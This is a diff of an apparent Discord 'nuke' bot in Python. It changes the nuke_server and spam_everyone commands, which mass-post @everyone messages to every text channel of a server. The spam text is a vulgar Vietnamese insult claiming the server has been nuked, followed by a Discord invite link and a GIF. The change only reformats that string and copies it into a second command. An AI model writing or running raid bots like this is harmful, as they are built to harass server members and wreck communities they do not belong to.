@@ -508,9 +508,9 @@ async def nuke_server(ctx):
             except:
                 continue
 
-        spam_content = "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI @everyone
-       https://discord.gg/2FKg4SugY
-        https://i.pinimg.com/originals/63/e8/c6/63e8c69c82b199405fc366ef778addf1.gif"
+        spam_content = spam_content = """# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI @everyone
+https://discord.gg/2FKg4SugY
+https://i.pinimg.com/originals/63/e8/c6/63e8c69c82b199405fc366ef778addf1.gif"""
     
 
         for channel in ctx.guild.text_channels:
@@ -599,7 +599,9 @@ async def spam_channels_error(ctx, error):
 async def spam_everyone(ctx):
     """Spam @everyone + câu chửi trong tất cả kênh text"""
     try:
-        spam_content = "@everyone # ĐỤ MẸ CẢ SERVER NÀY ĐI, LỒN MẸ MÀY NÁT BÉT NHƯ TƯƠNG! l!help"
+        spam_content = spam_content = """# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI @everyone
+https://discord.gg/2FKg4SugY
+https://i.pinimg.com/originals/63/e8/c6/63e8c69c82b199405fc366ef778addf1.gif"""
 
         embed = discord.Embed(
             title="🚀 KÍCH HOẠT SPAM @EVERYONE",
